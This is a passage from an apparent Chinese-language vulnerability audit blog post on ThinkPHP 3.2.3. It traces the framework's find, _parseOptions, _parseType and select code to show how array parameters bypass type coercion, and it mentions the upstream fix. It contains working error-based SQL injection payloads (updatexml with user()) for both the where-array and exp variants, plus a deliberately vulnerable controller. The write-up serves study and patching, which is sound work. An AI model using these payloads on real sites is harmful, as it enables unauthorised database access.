class="hljs-number">0</span>]);<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_after_find</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$options</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;result&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">returnResult</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$this</span>-&gt;options[<span class="hljs-string">&#x27;result&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-variable language_">$this</span>-&gt;data     =   <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cache</span>))&#123;<br>        <span class="hljs-title function_ invoke__">S</span>(<span class="hljs-variable">$key</span>,<span class="hljs-variable">$data</span>,<span class="hljs-variable">$cache</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data;<br>&#125;<br><span class="hljs-comment">// 查询成功的回调方法</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_after_find</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$result</span>,<span class="hljs-variable">$options</span></span>) </span>&#123;&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">returnResult</span>(<span class="hljs-params"><span class="hljs-variable">$data</span>,<span class="hljs-variable">$type</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$type</span>,<span class="hljs-variable">$data</span>);<br>        &#125;<br>        <span class="hljs-keyword">switch</span> (<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$type</span>))&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;json&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$data</span>);<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;xml&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">xml_encode</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>断点调试，发现会调用<code>ThinkPHP/Library/Think/Model.class.php:627</code>的 <code>_parseOptions</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_parseOptions</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$options</span>))<br>        <span class="hljs-variable">$options</span> =  <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;options,<span class="hljs-variable">$options</span>);<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]))&#123;<br>        <span class="hljs-comment">// 自动获取表名</span><br>        <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]   =   <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getTableName</span>();<br>        <span class="hljs-variable">$fields</span>             =   <span class="hljs-variable language_">$this</span>-&gt;fields;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 指定数据表 则重新获取字段列表 但不支持类型检测</span><br>        <span class="hljs-variable">$fields</span>             =   <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getDbFields</span>();<br>    &#125;<br><br>    <span class="hljs-comment">// 数据表别名</span><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;alias&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]  .=   <span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;alias&#x27;</span>];<br>    &#125;<br>    <span class="hljs-comment">// 记录操作的模型名称</span><br>    <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;model&#x27;</span>]       =   <span class="hljs-variable language_">$this</span>-&gt;name;<br><br>    <span class="hljs-comment">// 字段类型验证</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$fields</span>) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;join&#x27;</span>])) &#123;<br>        <span class="hljs-comment">// 对数组查询条件进行字段类型检查</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>            <span class="hljs-variable">$key</span>            =   <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$key</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$key</span>,<span class="hljs-variable">$fields</span>,<span class="hljs-literal">true</span>))&#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_scalar</span>(<span class="hljs-variable">$val</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_parseType</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>],<span class="hljs-variable">$key</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">elseif</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>) &amp;&amp; <span class="hljs-string">&#x27;_&#x27;</span> != <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$key</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &amp;&amp; <span class="hljs-literal">false</span> === <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$key</span>,<span class="hljs-string">&#x27;.&#x27;</span>) &amp;&amp; <span class="hljs-literal">false</span> === <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$key</span>,<span class="hljs-string">&#x27;(&#x27;</span>) &amp;&amp; <span class="hljs-literal">false</span> === <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$key</span>,<span class="hljs-string">&#x27;|&#x27;</span>) &amp;&amp; <span class="hljs-literal">false</span> === <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$key</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>))&#123;<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;strict&#x27;</span>]))&#123;<br>                    <span class="hljs-title function_ invoke__">E</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;_ERROR_QUERY_EXPRESS_&#x27;</span>).<span class="hljs-string">&#x27;:[&#x27;</span>.<span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$val</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                &#125; <br>                <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>][<span class="hljs-variable">$key</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 查询过后清空sql表达式组装 避免影响下次查询</span><br>    <span class="hljs-variable language_">$this</span>-&gt;options  =   <span class="hljs-keyword">array</span>();<br>    <span class="hljs-comment">// 表达式过滤</span><br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_options_filter</span>(<span class="hljs-variable">$options</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$options</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个方法下断点继续跟进，在<code>ThinkPHP/Library/Think/Model.class.php:654</code> 调用了 680 的<code>_parseType</code>进行类型转换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_parseType</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;bind&#x27;</span>][<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$key</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;fields[<span class="hljs-string">&#x27;_type&#x27;</span>][<span class="hljs-variable">$key</span>]))&#123;<br>        <span class="hljs-variable">$fieldType</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;fields[<span class="hljs-string">&#x27;_type&#x27;</span>][<span class="hljs-variable">$key</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span> !== <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fieldType</span>,<span class="hljs-string">&#x27;enum&#x27;</span>))&#123;<br>            <span class="hljs-comment">// 支持ENUM类型优先检测</span><br>        &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-literal">false</span> === <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fieldType</span>,<span class="hljs-string">&#x27;bigint&#x27;</span>) &amp;&amp; <span class="hljs-literal">false</span> !== <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fieldType</span>,<span class="hljs-string">&#x27;int&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>]   =  <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>]);<br>        &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-literal">false</span> !== <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fieldType</span>,<span class="hljs-string">&#x27;float&#x27;</span>) || <span class="hljs-literal">false</span> !== <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fieldType</span>,<span class="hljs-string">&#x27;double&#x27;</span>))&#123;<br>            <span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>]   =  <span class="hljs-title function_ invoke__">floatval</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>]);<br>        &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-literal">false</span> !== <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$fieldType</span>,<span class="hljs-string">&#x27;bool&#x27;</span>))&#123;<br>            <span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>]   =  (<span class="hljs-keyword">bool</span>)<span class="hljs-variable">$data</span>[<span class="hljs-variable">$key</span>];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后就会将参数传给select进行查询</p><p><code>$resultSet = $this-&gt;db-&gt;select($options);</code></p><p>把参数改为<code>?id=1&#39;</code>再走一遍看遇到sql注入时是如何处理的</p><p>发现经过<code>_parseTyp</code>e之后<code>id</code>就变成<code>1</code>了</p><p><img src="/mdimg/thinkphp23/1745137675627-bd3a2071-49de-4446-8c35-680e00586302.png"></p><p><code>_parseType</code>会根据数据库字段的类型强制转换输入的参数，因为<code>id</code>是<code>int</code>，所以会被<code>**intval()**</code><strong>取整转为1</strong></p><p><img src="/mdimg/thinkphp23/1745137698315-bae52f2d-cd4f-46ca-aa1d-5cd88409bade.png">这里类型转换就防止了sql注入，那么要进入<code>_parseType</code>要满足下面这个<code>if</code></p><p><code>if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;]))</code></p><p>关键点在第二个条件<code>is_array($options[&#39;where&#39;])</code></p><p>回到<code>find</code>方法可以看到传入的<code>id</code>是数字或者字符串的时候，就会满足第一个<code>if</code>，把<code>where</code>转为数组</p><p><img src="/mdimg/thinkphp23/1745137725855-95f348ed-8cf9-4443-91d2-4d65e8475a1d.png">当传入的参数是数组<code>?id[where]=1</code>的时候，就不会进入这个<code>if</code></p><p><img src="/mdimg/thinkphp23/1745137272498-9809d9ee-e28b-4eaf-ad9d-6110997744e9.png"></p><p>这样</p><p><code>if (isset($options[&#39;where&#39;]) &amp;&amp; is_array($options[&#39;where&#39;]) &amp;&amp; !empty($fields) &amp;&amp; !isset($options[&#39;join&#39;]))</code></p><p>的第二个条件<code>is_array($options[&#39;where&#39;])</code>就是<code>false</code>，就不会进入<code>_parseType</code>了</p><p>这样就可以进行注入了</p><h5 id="构造注入"><a href="#构造注入" class="headerlink" title="构造注入"></a><strong>构造注入</strong></h5><p>可以构造报错注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[where]=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,(select <span class="hljs-title function_ invoke__">user</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>   <span class="hljs-comment">//报错注入</span><br>?id[where]=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">updatexml</span>(<span class="hljs-number">1</span>,<span class="hljs-title function_ invoke__">concat</span>(<span class="hljs-number">0x7e</span>,(select <span class="hljs-title function_ invoke__">user</span>() <span class="hljs-keyword">from</span> user limit <span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>   <br></code></pre></td></tr></table></figure><p>注意一定要<code> limit 1</code>，只能回显一行，因为</p><p><img src="/mdimg/thinkphp23/1745137204500-6027a471-4746-44c3-b617-88d45071e015.png"></p><p>尝试一下</p><p><img src="/mdimg/thinkphp23/1745137776283-a242fe64-0bb4-4b4f-b177-8be54153f179.png"></p><h5 id="修复"><a href="#修复" class="headerlink" title="修复"></a><strong>修复</strong></h5><p><a href="https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04">https://github.com/top-think/thinkphp/commit/9e1db19c1e455450cfebb8b573bb51ab7a1cef04</a></p><p><img src="/mdimg/thinkphp23/1745137215590-dad96674-1d8b-4ef0-b67c-b8f800bf720c.png"></p><p><code>v3.2.4</code>将<code>$options</code>和<code>$this-&gt;options</code>进行了区分，从而传入的参数无法污染到<code>$this-&gt;options</code>，也就无法控制sql语句了。</p><h3 id="3-2-3-exp-sql注入"><a href="#3-2-3-exp-sql注入" class="headerlink" title="3.2.3 exp sql注入"></a><strong>3.2.3 exp sql注入</strong></h3><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a><strong>配置</strong></h4><p>修改一下控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Home</span>\<span class="hljs-title class_">Controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><span class="hljs-comment">//        $this-&gt;show(&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V&#123;$Think.version&#125;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&#x27;, &#x27;utf-8&#x27;);</span><br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = <span class="hljs-title function_ invoke__">D</span>(<span class="hljs-string">&#x27;user&#x27;</span>);<br>        <span class="hljs-variable">$map</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]);<br>        <span class="hljs-variable">$user</span> = <span class="hljs-variable">$User</span>-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-variable">$map</span>)-&gt;<span class="hljs-title function_ invoke__">find</span>();<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$user</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/mdimg/thinkphp23/1745137235641-9c3952fd-78b1-4de0-8961-5262ae53f087.png"></p><h4 id="审计-1"><a href="#审计-1" class="headerlink" title="审计"></a><strong>审计</strong></h4><p>payload：</p><p><code>?id[0]=exp&amp;id[1]==1 and updatexml(1,concat(0x7e,user(),0x7e),1)</code></p><p>在<code>find()</code>方法下断点一路跟进，发现到</p><p><code>$resultSet = $this-&gt;db-&gt;select($options);</code></p><p>会调用<code>ThinkPHP/Library/Think/Db/Driver.class.php:942</code>的<code>select</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;model  =   <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;model&#x27;</span>];<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseBind</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;bind&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;bind&#x27;</span>]:<span class="hljs-keyword">array</span>());<br>    <span class="hljs-variable">$sql</span>    = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildSelectSql</span>(<span class="hljs-variable">$options</span>);<br>    <span class="hljs-variable">$result</span>   = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>,!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;fetch_sql&#x27;</span>]) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续跟进会调用<code>ThinkPHP/Library/Think/Db/Driver.class.php:956</code>的<code>buildSelectSql</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buildSelectSql</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>        <span class="hljs-comment">// 根据页数计算limit</span><br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$page</span>,<span class="hljs-variable">$listRows</span>)   =   <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-variable">$page</span>    =  <span class="hljs-variable">$page</span>&gt;<span class="hljs-number">0</span> ? <span class="hljs-variable">$page</span> : <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$listRows</span>=  <span class="hljs-variable">$listRows</span>&gt;<span class="hljs-number">0</span> ? <span class="hljs-variable">$listRows</span> : (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>]:<span class="hljs-number">20</span>);<br>        <span class="hljs-variable">$offset</span>  =  <span class="hljs-variable">$listRows</span>*(<span class="hljs-variable">$page</span>-<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;limit&#x27;</span>] =  <span class="hljs-variable">$offset</span>.<span class="hljs-string">&#x27;,&#x27;</span>.<span class="hljs-variable">$listRows</span>;<br>    &#125;<br>    <span class="hljs-variable">$sql</span>  =   <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseSql</span>(<span class="hljs-variable">$this</span>-&gt;selectSql,<span class="hljs-variable">$options</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$sql</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续跟进会调用<code>ThinkPHP/Library/Think/Db/Driver.class.php:975</code> 的<code>parsetSql</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseSql</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>,<span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span>&#123;<br>    <span class="hljs-variable">$sql</span>   = <span class="hljs-title function_ invoke__">str_replace</span>(<br>        <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;%TABLE%&#x27;</span>,<span class="hljs-string">&#x27;%DISTINCT%&#x27;</span>,<span class="hljs-string">&#x27;%FIELD%&#x27;</span>,<span class="hljs-string">&#x27;%JOIN%&#x27;</span>,<span class="hljs-string">&#x27;%WHERE%&#x27;</span>,<span class="hljs-string">&#x27;%GROUP%&#x27;</span>,<span class="hljs-string">&#x27;%HAVING%&#x27;</span>,<span class="hljs-string">&#x27;%ORDER%&#x27;</span>,<span class="hljs-string">&#x27;%LIMIT%&#x27;</span>,<span class="hljs-string">&#x27;%UNION%&#x27;</span>,<span class="hljs-string">&#x27;%LOCK%&#x27;</span>,<span class="hljs-string">&#x27;%COMMENT%&#x27;</span>,<span class="hljs-string">&#x27;%FORCE%&#x27;</span>),<br>        <span class="hljs-keyword">array</span>(<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseTable</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseDistinct</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;distinct&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;distinct&#x27;</span>]:<span class="hljs-literal">false</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseField</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;field&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;field&#x27;</span>]:<span class="hljs-string">&#x27;*&#x27;</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseJoin</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;join&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;join&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseWhere</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;where&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseGroup</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;group&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;group&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">parseHaving</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;having&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;having&#x27;</span>]:<span class="hljs-string">&#x27;&#x27;</span>),<br>            <span class="hljs-variable 